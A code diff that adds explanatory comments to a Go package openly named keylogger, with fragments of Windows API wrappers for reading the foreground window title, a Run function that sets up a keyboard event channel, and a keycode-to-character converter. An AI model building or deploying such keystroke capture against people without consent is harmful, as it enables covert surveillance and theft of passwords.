@@ -1,3 +1,4 @@
+// package keylogger... it's a keylogger.
 package keylogger
 
 import (
@@ -31,6 +32,7 @@ type (
 	HWND   HANDLE
 )
 
+// Gets length of text of window text by HWND
 func GetWindowTextLength(hwnd HWND) int {
 	ret, _, _ := procGetWindowTextLength.Call(
 		uintptr(hwnd))
@@ -38,6 +40,7 @@ func GetWindowTextLength(hwnd HWND) int {
 	return int(ret)
 }
 
+// Gets text of window text by HWND
 func GetWindowText(hwnd HWND) string {
 	textLen := GetWindowTextLength(hwnd) + 1
 
@@ -50,12 +53,14 @@ func GetWindowText(hwnd HWND) string {
 	return syscall.UTF16ToString(buf)
 }
 
+// Gets current foreground window
 func GetForegroundWindow() uintptr {
 	proc := mod.NewProc("GetForegroundWindow")
 	hwnd, _, _ := proc.Call()
 	return hwnd
 }
 
+// Runs the keylogger
 func Run() error {
 	// Buffer size is depends on your need. The 100 is placeholder value.
 	keyboardChan := make(chan types.KeyboardEvent, 100)
@@ -89,6 +94,7 @@ func Run() error {
 	}
 }
 
+// Converts from Virtual-Keycode to Ascii rune
 func VKCodeToAscii(k types.KeyboardEvent) rune {
 	var buffer []uint16 = make([]uint16, 256)
 	var keyState []byte = make([]byte, 256)
